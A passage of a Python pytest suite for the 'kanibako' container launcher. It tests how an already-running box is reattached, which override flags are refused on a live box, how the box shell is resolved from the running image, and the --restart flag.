            self._bundle(tmp_path, "NAVIGATOR_API_KEY"),
        )
        assert err is None and ep == self._ENDPOINT
        assert provider.env_key == "NAVIGATOR_API_KEY"

    def test_a_store_key_that_DIFFERS_from_the_file_key_is_ambiguous(self, tmp_path):
        """Two vars, and no way to pick the env_key — the ambiguous arm, correctly."""
        file_tok = tmp_path / "file-tok"
        file_tok.write_text("sk-file\n")
        _ep, err, _p = self._run(
            self._cfg(secret_path={"OTHER_KEY": str(file_tok)}),
            self._bundle(tmp_path, "NAVIGATOR_API_KEY"),
        )
        assert err is not None
        assert "ambiguous" in err
        assert "OTHER_KEY" in err and "NAVIGATOR_API_KEY" in err

    def test_multiple_file_keys_stay_ambiguous(self, tmp_path):
        """Unchanged behavior: the store is not what made this ambiguous."""
        _ep, err, _p = self._run(
            self._cfg(secret_path={"A_KEY": "/a", "B_KEY": "/b"}),
            self._bundle(tmp_path, "A_KEY"),
        )
        assert err is not None and "ambiguous" in err

    def test_no_key_anywhere_is_none_was_found_not_ambiguous(self, tmp_path):
        """The ZERO sub-case stays its own message."""
        _ep, err, _p = self._run(
            self._cfg(), self._bundle(tmp_path, "NAVIGATOR_API_KEY", token=False),
        )
        assert err is not None
        assert "none was found" in err
        assert "ambiguous" not in err

    def test_a_store_key_pointing_at_an_unusable_file_names_the_key(self, tmp_path):
        """The UNUSABLE sub-case survives the second source."""
        from kanibako.persona_store import PersonaBundle

        _ep, err, _p = self._run(
            self._cfg(),
            PersonaBundle(
                endpoint=self._ENDPOINT, model="gemma4",
                auth_env="NAVIGATOR_API_KEY",
                token_path=tmp_path / "does-not-exist",
            ),
        )
        assert err is not None
        assert "unusable file" in err
        assert "NAVIGATOR_API_KEY" in err


# ---------------------------------------------------------------------------
# 2026-08-05f — the REATTACH FAST PATH, the running-box OVERRIDE GATE, and
# ``--restart``.
#
# The defect these cover: ``_run_container`` computed ``reattach_running`` up
# top and then never consulted it until the reattach branch ~380 lines later, so
# a box that was ALREADY UP still paid the whole launch preamble — rig
# resolution + build/pull, the flag-persist seam, the image-freshness check, an
# ephemeral baseline probe container, and (the report that opened this) the
# per-launch persona network probe, which HARD-ERRORS on a REJECTED verdict and
# could therefore refuse to reattach a user to a working box.
# ---------------------------------------------------------------------------


class _RunningBoxDriver:
    """Shared helpers for the three classes below."""

    _PERSONA = "navigator℘claude"

    def _running(self, m, agent: str = "claude"):
        """Put the harness in the ALREADY-RUNNING state a reattach sees."""
        m.runtime.is_running.return_value = True
        m.runtime.inspect_env.return_value = agent

    def _start(self, **over):
        kw = dict(
            project_dir=None, entrypoint=None, image_override=None,
            new_session=False, safe_mode=False, resume_mode=False,
            extra_args=[], persistent=True,
        )
        kw.update(over)
        return _run_container(**kw)


class TestReattachFastPath(_RunningBoxDriver):
    """A live box skips every step that only a NEW container needs."""

    def test_reattach_does_not_resolve_or_prep_a_rig(self, start_mocks):
        with start_mocks() as m, patch(
            "kanibako.commands.start.resolve_rig",
        ) as m_rig:
            self._running(m)
            assert self._start() == 0
            m_rig.assert_not_called()
        # Control: the assertion is not vacuous — an ordinary launch DOES.
        with start_mocks() as m, patch(
            "kanibako.commands.start.resolve_rig",
        ) as m_rig:
            self._start()
            assert m_rig.called

    def test_reattach_does_not_run_the_baseline_probe(self, start_mocks):
        """The tier-1/tier-2 probe spins an EPHEMERAL container; a running box
        was already verified by the launch that started it."""
        with start_mocks() as m:
            self._running(m)
            assert self._start() == 0
            m.launch_check.assert_not_called()
        with start_mocks() as m:
            self._start()
            assert m.launch_check.called

    def test_reattach_does_not_check_image_freshness(self, start_mocks):
        with start_mocks() as m, patch(
            "kanibako.runtime.freshness.check_image_freshness",
        ) as m_fresh:
            self._running(m)
            assert self._start() == 0
            m_fresh.assert_not_called()
        with start_mocks() as m, patch(
            "kanibako.runtime.freshness.check_image_freshness",
        ) as m_fresh:
            self._start()
            assert m_fresh.called

    def test_reattach_does_not_reach_the_flag_persist_seam(self, start_mocks):
        """§1A ruling #12's seam must never observe a running box: every input
        it settles is refused by the override gate instead."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._persist_or_announce_flags",
        ) as m_seam:
            self._running(m)
            assert self._start() == 0
            m_seam.assert_not_called()
        with start_mocks() as m, patch(
            "kanibako.commands.start._persist_or_announce_flags",
        ) as m_seam:
            self._start()
            assert m_seam.called

    def test_reattach_does_not_verify_box_components(self, start_mocks):
        """A RUNNING box is materialised by definition — its dirs are live
        bind mounts."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._check_box_components", return_value=None,
        ) as m_comp:
            self._running(m)
            assert self._start() == 0
            m_comp.assert_not_called()
        with start_mocks() as m, patch(
            "kanibako.commands.start._check_box_components", return_value=None,
        ) as m_comp:
            self._start()
            assert m_comp.called

    def test_reattach_does_not_probe_the_persona(self, start_mocks):
        """⚑ THE REPORTED BUG.  The load-or-error pre-flight posts a real 1-token
        completion and returns rc 1 on REJECTED — i.e. it could refuse to
        reattach a user to a box whose agent is already running and
        authenticated."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._preflight_persona_load",
        ) as m_pre:
            m.resolve_agent.return_value = _sel(self._PERSONA)
            self._running(m, agent=self._PERSONA)
            assert self._start() == 0
            m_pre.assert_not_called()

    def test_a_normal_persona_launch_still_probes(self, start_mocks):
        """The control for the test above: the pre-flight is untouched on the
        path that actually creates a container."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._preflight_persona_load",
            return_value=("https://key.example", None, None),
        ) as m_pre:
            m.resolve_agent.return_value = _sel(self._PERSONA)
            self._start()
            assert m_pre.called
            assert m_pre.call_args.kwargs.get("probe") is True

    def test_reattach_never_writes_the_agent_config(self, start_mocks):
        """A reattach delivers nothing, and rewriting under a live agent is the
        hazard ``reattach_config_notice`` exists to warn about."""
        with start_mocks() as m, patch(
            "kanibako.commands.start.write_agent_config",
        ) as m_write:
            # First use (config absent) is the only thing that ever writes it.
            m.agent_config_path.exists.return_value = False
            self._running(m)
            assert self._start() == 0
            m_write.assert_not_called()
        with start_mocks() as m, patch(
            "kanibako.commands.start.write_agent_config",
        ) as m_write:
            m.agent_config_path.exists.return_value = False
            self._start()
            assert m_write.called

    def test_reattach_still_refreshes_creds_and_attaches(self, start_mocks):
        """The preserved half: credsync, the projection notice, the bootstrap
        attach, the post-session writeback, and the teardown all still fire."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._teardown_persistent_box",
        ) as m_teardown:
            m.target.reattach_config_notice.return_value = None
            self._running(m)
            assert self._start() == 0
            assert m.credsync.refresh_box_credentials.called
            assert m.credsync.writeback_box_credentials.called
            assert m_teardown.called
            attach = [
                c for c in m.runtime.exec.call_args_list
                if c.kwargs.get("attach") is True
            ]
            assert len(attach) == 1
            assert attach[0].args[1] == ["tmux", "attach", "-t", "kanibako"]

    def test_reattach_suppresses_oauth_for_a_persona_endpoint(self, start_mocks):
        """``suppress_oauth`` is FINAL on this path (the pre-flight that could
        refine the endpoint is skipped), so the launch decisions' endpoint is the
        last word — a third-party endpoint still drops the host OAuth sync."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(_SHARED_AUTH, "https://key.example", None),
        ):
            self._running(m)
            assert self._start() == 0
            assert m.credsync.refresh_box_credentials.call_args.kwargs[
                "suppress_oauth"
            ] is True

    def test_detach_on_a_running_box_still_short_circuits(self, start_mocks, capsys):
        """The ratified early return, unchanged — including its
        ``--print-container`` stdout line."""
        with start_mocks() as m:
            self._running(m)
            assert self._start(detach=True, print_container=True) == 0
            out = capsys.readouterr()
        assert "is already running" in out.err
        assert out.out.strip().splitlines()[-1] == "kanibako-testproject"
        m.runtime.exec.assert_not_called()

    def test_entrypoint_on_a_running_box_execs_instead_of_attaching(
        self, start_mocks,
    ):
        """S3: ``--entrypoint`` against a live box is a SECOND PROCESS entering
        it, not a reattach.  Today it is silently dropped, because ``start``
        defaults ``persistent=True`` whenever the bootstrap program is present."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(entrypoint="/bin/echo", extra_args=["hi"],
                             cli_env=["FOO=bar"])
        assert rc == 0
        call = m.runtime.exec.call_args
        assert call.args[1] == ["/bin/echo", "hi"]
        assert call.kwargs.get("env") == {"FOO": "bar"}
        assert call.kwargs.get("attach") is not True


class TestShellAtALiveBoxResolvesFromTheRunningImage(_RunningBoxDriver):
    """2026-08-05g S1 — ``kanibako shell --persistent <live box>`` handed the
    user the AGENT'S tmux session instead of a shell.

    Cause: ``resolve_box_shell`` sits inside the ``not reattach_running`` prep
    block, so on a reattach ``entrypoint`` stayed None, the fast path's exec arm
    was skipped, and it fell through to the bootstrap attach.  Fix (Jei's ruling,
    option 1): resolve the shell in the fast path FROM THE RUNNING CONTAINER'S
    OWN IMAGE.

    ⚑ SCOPED TO A BOX RUNNING AN AGENT, keyed on the live ``KANIBAKO_AGENT``
    stamp — ``self._running(m)`` supplies one.  A live NO-AGENT box's tmux
    session IS the user's own shell, so it must keep reattaching; that is
    ``test_a_live_no_agent_box_reattaches_to_its_own_shell_session``.
    """

    _LIVE_IMAGE = "ghcr.io/doctorjei/live-box:latest"

    def _shell(self, **over):
        """``kanibako shell`` (interactive, no agent) with ``--persistent``."""
        kw = dict(box_shell_mode=True, explicit_persistent=True)
        kw.update(over)
        return self._start(**kw)

    def test_shell_persistent_at_a_running_box_execs_a_shell(self, start_mocks):
        """⚑ THE REPORTED BUG.  The user asked for a shell and must get one —
        not ``tmux attach`` onto the running agent's session."""
        with start_mocks() as m:
            m.merged.box_shell = "/bin/zsh"
            m.runtime.container_image.return_value = self._LIVE_IMAGE
            self._running(m)
            rc = self._shell()
        assert rc == 0
        call = m.runtime.exec.call_args
        assert call.args[1] == ["/bin/zsh"]
        assert call.kwargs.get("attach") is not True
        assert not [
            c for c in m.runtime.exec.call_args_list
            if c.kwargs.get("attach") is True
        ]

    def test_the_image_tier_reads_the_running_containers_own_image(
        self, start_mocks,
    ):
        """⚑ The load-bearing half of the ruling: the image tier comes from
        ``.ImageName`` (what the box was CREATED from), never from the
        module-level ``image``, which this path never ran through
        ``resolve_rig`` and which can therefore name a different rig."""
        with start_mocks() as m, patch(
            "kanibako.launch.shells.resolve_box_shell",
            return_value=("/bin/bash", "image"),
        ) as m_resolve:
            m.runtime.container_image.return_value = self._LIVE_IMAGE
            self._running(m)
            assert self._shell() == 0
            m.runtime.container_image.assert_called_once_with("kanibako-testproject")
            kwargs = m_resolve.call_args.kwargs
        assert kwargs["image"] == self._LIVE_IMAGE
        # ... and NOT the configured rig the merged config carries.
        assert m.merged.box_image == "test:latest"
        assert kwargs["image"] != "test:latest"
        # ⚑ The runtime goes in WITH it, and is not optional decoration: without
        # one ``resolve_box_shell`` can neither compute the digest store key nor
        # lazily probe (``launch/shells.py``), so a box whose image shell was
        # never captured would silently fall to ``sh`` instead of the image's
        # own login shell.  A ``runtime=None`` implementation passes every other
        # assertion in this class.
        assert kwargs["runtime"] is m.runtime
        assert m.runtime.exec.call_args.args[1] == ["/bin/bash"]

    def test_an_unreadable_container_image_drops_the_image_tier(self, start_mocks):
        """``container_image()`` → None (podman inspect failure; Docker has no
        ``.ImageName``).  We degrade the tier rather than substitute the wrong
        image — so both ``image`` and ``runtime`` go in as None."""
        with start_mocks() as m, patch(
            "kanibako.launch.shells.resolve_box_shell",
            return_value=("sh", "sh"),
        ) as m_resolve:
            m.runtime.container_image.return_value = None
            self._running(m)
            assert self._shell() == 0
            kwargs = m_resolve.call_args.kwargs
        assert kwargs["image"] is None
        assert kwargs["runtime"] is None

    def test_the_degraded_resolve_never_probes_the_configured_rig(
        self, start_mocks, monkeypatch,
    ):
        """The same case through the REAL resolver: with no readable live image
        it falls ``box.shell`` -> ``$KANIBAKO_SHELL`` -> ``sh`` and touches no
        image at all (an image probe here would be probing the WRONG one)."""
        monkeypatch.delenv("KANIBAKO_SHELL", raising=False)
        with start_mocks() as m:
            m.merged.box_shell = ""
            m.runtime.container_image.return_value = None
            self._running(m)
            rc = self._shell()
        assert rc == 0
        assert m.runtime.exec.call_args.args[1] == ["sh"]
        m.runtime.get_local_digest.assert_not_called()

    def test_a_live_no_agent_box_reattaches_to_its_own_shell_session(
        self, start_mocks,
    ):
        """⚑ THE ARM MUST NOT FIRE AT A LIVE NO-AGENT BOX.  Such a box has PID-1
        ``tmux new-session -s kanibako -- <box shell>`` (pinned in
        ``test_start_extended.py``), so its tmux session IS the user's own
        shell.  Exec'ing a fresh shell here would strand it — a running build
        would become unreachable through ``shell``.  The discriminator is the
        live ``KANIBAKO_AGENT`` stamp, not what this invocation requested: both
        legs below type the identical command."""
        with start_mocks() as m:
            m.merged.box_shell = "/bin/zsh"
            m.runtime.container_image.return_value = self._LIVE_IMAGE
            self._running(m, agent=None)          # no stamp == no agent in there
            assert self._shell() == 0
            attach = [
                c for c in m.runtime.exec.call_args_list
                if c.kwargs.get("attach") is True
            ]
            assert len(attach) == 1
            assert attach[0].args[1] == ["tmux", "attach", "-t", "kanibako"]
            assert not [
                c for c in m.runtime.exec.call_args_list
                if c.args[1] == ["/bin/zsh"]
            ]
            # ... and the live image is never even read: nothing to resolve.
            m.runtime.container_image.assert_not_called()
        # Control: the SAME command at a box that IS running an agent execs the
        # resolved shell, so the assertion above pins the stamp, not the class.
        with start_mocks() as m:
            m.merged.box_shell = "/bin/zsh"
            m.runtime.container_image.return_value = self._LIVE_IMAGE
            self._running(m)
            assert self._shell() == 0
        assert m.runtime.exec.call_args.args[1] == ["/bin/zsh"]

    def test_an_ordinary_agent_reattach_is_unchanged(self, start_mocks):
        """The control: without ``box_shell_mode`` nothing here fires and the
        agent reattach is still the bootstrap attach."""
        with start_mocks() as m:
            m.runtime.container_image.return_value = self._LIVE_IMAGE
            self._running(m)
            assert self._start() == 0
            m.runtime.container_image.assert_not_called()
        attach = [
            c for c in m.runtime.exec.call_args_list
            if c.kwargs.get("attach") is True
        ]
        assert len(attach) == 1
        assert attach[0].args[1] == ["tmux", "attach", "-t", "kanibako"]

    def test_per_run_env_is_still_refused_by_the_override_gate(
        self, start_mocks, capsys,
    ):
        """⚑ PINS TODAY'S BEHAVIOUR, NOT AN ENDORSEMENT OF IT (reported
        2026-08-05g).  The exec this path lands on DOES apply ``-e``, but the
        override gate runs far earlier and reads ``entrypoint``, which is still
        None for a box-shell reattach at that point — so ``-e/--env`` is refused
        before the resolve ever happens.  ``kanibako shell -e`` (ephemeral, the
        shell's own default) is unaffected: it never becomes a reattach.  If the
        gate is re-ruled, this test changes with it."""
        with start_mocks() as m:
            self._running(m)
            rc = self._shell(cli_env=["FOO=bar"])
        err = capsys.readouterr().err
        assert rc == 1
        assert "-e/--env" in err
        m.runtime.exec.assert_not_called()


class TestRunningBoxOverrideGate(_RunningBoxDriver):
    """Overrides that cannot be integrated into a live box are REFUSED BY NAME
    (Jei 2026-08-05: "could this setting work without restarting the box and
    without making a mangled / corrupted / unexpected state?")."""

    _CLASS_A = [
        ("image_override", "test:other", "--rig/--image"),
        ("cli_env", ["FOO=bar"], "-e/--env"),
        ("no_helpers", True, "--no-helpers"),
        ("no_auto_auth", True, "--no-auto-auth"),
        ("browser", True, "--browser"),
        ("share_images", True, "--share-images"),
    ]
    _CLASS_B = [
        ("new_session", True, "-N/--new"),
        ("continue_override", True, "-C/--continue"),
        ("resume_mode", True, "-R/--resume"),
        ("model_override", "opus", "-M/--model"),
        ("autonomous", True, "-A/--autonomous"),
        ("safe_mode", True, "-S/--secure"),
    ]

    @pytest.mark.parametrize("kwarg,value,label", _CLASS_A)
    def test_class_a_override_is_refused(
        self, start_mocks, capsys, kwarg, value, label,
    ):
        with start_mocks() as m:
            self._running(m)
            rc = self._start(**{kwarg: value})
        err = capsys.readouterr().err
        assert rc == 1
        assert label in err
        assert "already running" in err
        assert "kanibako --restart testproject" in err
        m.runtime.exec.assert_not_called()

    @pytest.mark.parametrize("kwarg,value,label", _CLASS_B)
    def test_class_b_override_is_refused(
        self, start_mocks, capsys, kwarg, value, label,
    ):
        """Class B is SILENTLY DROPPED today: the reattach execs a tmux attach,
        so the agent argv is never rebuilt and ``start -N`` lands you in the OLD
        conversation."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(**{kwarg: value})
        err = capsys.readouterr().err
        assert rc == 1
        assert label in err
        m.runtime.exec.assert_not_called()

    def test_one_error_names_every_offending_flag(self, start_mocks, capsys):
        with start_mocks() as m:
            self._running(m)
            rc = self._start(image_override="x:y", new_session=True)
        err = capsys.readouterr().err
        assert rc == 1
        assert "--rig/--image" in err and "-N/--new" in err

    def test_gate_precedes_the_flag_persist_seam(self, start_mocks):
        """``_persist_or_announce_flags`` must never observe a Class-A flag on a
        running box — it would store/announce a value the box cannot honour."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._persist_or_announce_flags",
        ) as m_seam:
            self._running(m)
            assert self._start(image_override="x:y") == 1
            m_seam.assert_not_called()

    def test_a_plain_reattach_is_not_refused(self, start_mocks, capsys):
        with start_mocks() as m:
            self._running(m)
            assert self._start() == 0
        assert "cannot be applied" not in capsys.readouterr().err

    def test_the_same_flags_are_fine_when_the_box_is_not_running(self, start_mocks):
        with start_mocks() as m:
            assert m.runtime.is_running.return_value is False
            assert self._start(image_override="x:y", new_session=True) == 0

    def test_attach_control_flags_stay_working(self, start_mocks, capsys):
        """``--detach``/``--print-container``/``--warm-only`` are meaningful
        against a live box and are deliberately NOT gated."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(detach=True, print_container=True, warm_only=True)
        assert rc == 0
        assert "cannot be applied" not in capsys.readouterr().err

    # ---- the two SESSION-SHAPE flags -------------------------------------
    # Keyed on the flag the user TYPED, never on the derived ``persistent``.

    def test_explicit_persistent_at_a_live_box_is_refused(
        self, start_mocks, capsys,
    ):
        """Jei: "it shouldn't be necessary to kill tmux for this; we should find
        out if tmux is running BEFORE we try to reattach."  The refusal lands
        before any attach, so the running session is never touched."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(explicit_persistent=True)
        err = capsys.readouterr().err
        assert rc == 1
        assert "--persistent" in err
        assert "kanibako --restart testproject" in err
        # ⚑ The running session is left completely alone: no attach, no exec of
        # any kind, no stop, no rm.
        m.runtime.exec.assert_not_called()
        m.runtime.stop.assert_not_called()
        m.runtime.rm.assert_not_called()

    def test_explicit_ephemeral_at_a_live_box_is_refused(
        self, start_mocks, capsys,
    ):
        """⚑ This is why the gate keys on ``box_running``, not
        ``reattach_running``: an explicit ``--ephemeral`` DERIVES
        ``persistent=False``, so it never becomes a reattach at all."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(persistent=False, explicit_ephemeral=True)
        err = capsys.readouterr().err
        assert rc == 1
        assert "--ephemeral" in err
        assert "kanibako --restart testproject" in err
        m.runtime.exec.assert_not_called()

    def test_a_default_inferred_persistent_reattach_still_reattaches(
        self, start_mocks, capsys,
    ):
        """⚑ THE CONTROL THAT PROVES THE KEYING.  ``run_start`` defaults
        ``persistent=True`` whenever the bootstrap program is present, so an
        ordinary ``kanibako start`` arrives here with ``persistent`` True and NO
        typed flag.  Gating on the derived value would refuse every reattach."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(persistent=True, explicit_persistent=False)
        err = capsys.readouterr().err
        assert rc == 0
        assert "cannot be applied" not in err
        assert "Reattaching to running box" in err
        attach = [
            c for c in m.runtime.exec.call_args_list
            if c.kwargs.get("attach") is True
        ]
        assert len(attach) == 1

    def test_shell_into_a_live_box_is_not_refused(self, start_mocks):
        """``kanibako shell --ephemeral`` against a live box execs INTO it (the
        documented UX) — ephemeral is the shell's own default and it is
        honoured, not dropped, so there is nothing to refuse.  Scoping the
        session-shape refusal to an AGENT launch is what keeps this working."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(
                persistent=False, explicit_ephemeral=True, box_shell_mode=True,
            )
        assert rc == 0
        assert m.runtime.exec.called

    def test_derived_ephemeral_still_hits_the_older_already_running_error(
        self, start_mocks, capsys,
    ):
        """The two errors cannot both fire, and the older one keeps a real case:
        ``persistent`` also derives False when the bootstrap program is missing
        from the HOST, with no flag typed.  This gate stays out of that, and the
        older message is accurate there."""
        with start_mocks() as m:
            self._running(m)
            m.runtime.container_exists.return_value = True
            rc = self._start(persistent=False)
        err = capsys.readouterr().err
        assert rc == 1
        assert "A box is already running for this project" in err
        assert "kanibako --restart" in err
        assert "cannot be applied" not in err

    def test_env_is_allowed_alongside_an_entrypoint(self, start_mocks):
        """``-e`` is refused on a REATTACH (nothing would apply it) but honoured
        on the ``--entrypoint`` exec, which does."""
        with start_mocks() as m:
            self._running(m)
            rc = self._start(entrypoint="/bin/echo", cli_env=["FOO=bar"])
        assert rc == 0
        assert m.runtime.exec.call_args.kwargs.get("env") == {"FOO": "bar"}


class TestRestartFlag(_RunningBoxDriver):
    """``--restart`` = stop, then start fresh with this invocation's flags.  It
    is the cure the override gate names, and it bypasses both the gate and the
    fast path by construction (it runs before ``reattach_running`` is computed)."""

    def _stop_patch(self, m):
        """Patch the stop verb, mirroring reality: after it, nothing is up."""
        def _stopped(*a, **kw):
            m.runtime.is_running.return_value = False
            return 0
        return patch(
            "kanibako.commands.stop._stop_one", side_effect=_stopped,
        )

    def test_parser_exposes_restart(self):
        from kanibako.cli import build_parser

        args = build_parser().parse_args(["start", "--restart", "mybox"])
        assert args.restart is True
        assert args.project == "mybox"

    def test_bare_kanibako_restart_round_trips_to_start(self):
        """The error text tells the user to run ``kanibako --restart``; pin that
        the dispatcher actually lands it on ``start``.  ``_normalize_command``
        leaves a leading flag with NO subcommand alone, and ``main``'s fallback
        rule then prepends ``start``."""
        from kanibako.cli import _SUBCOMMANDS, _normalize_command, build_parser

        for argv in (["--restart"], ["--restart", "mybox"]):
            effective = _normalize_command(list(argv))
            assert effective == argv          # nothing to reorder
            assert effective[0] not in _SUBCOMMANDS
            effective = ["start"] + effective
            args = build_parser().parse_args(effective)
            assert args.restart is True
            assert args.func.__name__ == "run_start"
        assert build_parser().parse_args(
            ["start", "--restart", "mybox"],
        ).project == "mybox"

    def test_run_start_threads_the_flag(self):
        ns = argparse.Namespace(
            project=None, box=None, agent_args=[], entrypoint=None, image=None,
            new_session=False, continue_session=False, resume_session=False,
            autonomous=False, secure=False, model=None, env=None,
            no_helpers=False, no_auto_auth=False, browser=False,
            share_images=False, persistent=False, ephemeral=False,
            detach=None, warm_only=False, agent=None, restart=True,
        )
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            assert run_start(ns) == 0
        assert m_run.call_args.kwargs.get("restart") is True

    def test_run_start_threads_the_typed_persistence_flags(self):
        """⚑ The typed flags must arrive as THEIR OWN values.  ``persistent``
        derives True from the mere presence of the bootstrap program, so a
        consumer that re-derived intent from it would refuse every reattach."""
        base = dict(
            project=None, box=None, agent_args=[], entrypoint=None, image=None,
            new_session=False, continue_session=False, resume_session=False,
            autonomous=False, secure=False, model=None, env=None,
            no_helpers=False, no_auto_auth=False, browser=False,
            share_images=False, detach=None, warm_only=False, agent=None,
            restart=False,
        )
        cases = [
            ({"persistent": False, "ephemeral": False}, False, False, True),
            ({"persistent": True, "ephemeral": False}, True, False, True),
            ({"persistent": False, "ephemeral": True}, False, True, False),
        ]
        for over, exp_p, exp_e, exp_derived in cases:
            with patch(
                "kanibako.commands.start._run_container", return_value=0,
            ) as m_run, patch(
                "kanibako.commands.start._bootstrap_available", return_value=True,
            ):
                run_start(argparse.Namespace(**{**base, **over}))
            kw = m_run.call_args.kwargs
            assert kw.get("explicit_persistent") is exp_p
            assert kw.get("explicit_ephemeral") is exp_e
            # The DERIVED mode is a separate value and is NOT the typed flag.
            assert kw.get("persistent") is exp_derived

    def test_run_shell_threads_the_typed_persistence_flags(self):
        """``shell`` owns the same two flags and must report them the same way —
        even though its default mode is ephemeral either way."""
        from kanibako.commands.start import run_shell

        for over, exp_p, exp_e in (
            ({"persistent": False, "ephemeral": False}, False, False),
            ({"persistent": True, "ephemeral": False}, True, False),
            ({"persistent": False, "ephemeral": True}, False, True),
        ):
            ns = argparse.Namespace(
                project=None, box=None, shell_args=[], entrypoint=None,
                image=None, no_helpers=False, share_images=False, env=None,
                agent=None, **over,
            )
            with patch(
                "kanibako.commands.start._run_container", return_value=0,
            ) as m_run:
                run_shell(ns)
            kw = m_run.call_args.kwargs
            assert kw.get("explicit_persistent") is exp_p
            assert kw.get("explicit_ephemeral") is exp_e

    def test_restart_stops_the_box_then_launches(self, start_mocks):
        with start_mocks() as m, self._stop_patch(m) as m_stop:
            self._running(m)
            assert self._start(restart=True) == 0
            assert m_stop.called
            assert m_stop.call_args.kwargs.get("project_dir") is None
            # A FRESH container, not a reattach.
            assert m.runtime.run.called

    def test_restart_bypasses_the_override_gate(self, start_mocks, capsys):
        """Passing ``--restart`` IS the user saying "I know this needs a new
        container, do it" — so the Class-A/B refusal must not fire."""
        with start_mocks() as m, self._stop_patch(m):
            self._running(m)
            rc = self._start(restart=True, image_override="x:y", new_session=True)
        assert rc == 0
        assert "cannot be applied" not in capsys.readouterr().err

    def test_restart_bypasses_the_session_shape_refusal(self, start_mocks):
        """``--restart --persistent`` is coherent: stop the old session, give me
        the fresh persistent one I asked for."""
        with start_mocks() as m, self._stop_patch(m):
            self._running(m)
            assert self._start(restart=True, explicit_persistent=True) == 0
            assert m.runtime.run.called

    def test_restart_bypasses_the_fast_path(self, start_mocks):
        """After the stop there is nothing to reattach to, so the full launch
        preamble runs and the overrides reach the new container."""
        with start_mocks() as m, self._stop_patch(m), patch(
            "kanibako.commands.start.resolve_rig",
        ) as m_rig:
            self._running(m)
            assert self._start(restart=True, image_override="x:y") == 0
            assert m_rig.called
            assert m.launch_check.called

    def test_restart_bypasses_the_agent_mismatch_error(self, start_mocks):
        """A different ``--agent`` on a running box is a hard error; with
        ``--restart`` the box is gone before that check, so it relaunches."""
        with start_mocks() as m, self._stop_patch(m):
            self._running(m, agent="claude")
            m.resolve_agent.return_value = _sel("goose")
            m.target.name = "goose"
            assert self._start(restart=True, explicit_agent="goose") == 0
        # Control: without --restart the same invocation is a hard error.
        from kanibako.errors import KanibakoError

        with start_mocks() as m:
            self._running(m, agent="claude")
            m.resolve_agent.return_value = _sel("goose")
            m.target.name = "goose"
            with pytest.raises(KanibakoError, match="already running agent"):
                self._start(explicit_agent="goose")

    def test_restart_on_a_stopped_box_is_not_an_error(self, start_mocks):
        """``--restart`` means "this launch must be a fresh container with my
        flags applied"; a stopped box already satisfies that, and erroring would
        make a ``--restart`` alias fail purely because it won the race."""
        with start_mocks() as m, self._stop_patch(m) as m_stop:
            assert m.runtime.is_running.return_value is False
            assert self._start(restart=True) == 0
            m_stop.assert_not_called()

    def test_restart_errors_when_the_stop_did_not_take(self, start_mocks, capsys):
        """``podman stop`` blocks, so the container IS down when the stop verb
        returns — but the verb returns 0 even when the stop failed, so verify
        rather than assume.  Relaunching into a live name would otherwise fail
        much deeper, in ``runtime.run``."""
        with start_mocks() as m, patch(
            "kanibako.commands.stop._stop_one", return_value=0,
        ):
            self._running(m)
            rc = self._start(restart=True)
        err = capsys.readouterr().err
        assert rc == 1
        assert "could not stop" in err
        assert "kanibako stop testproject" in err
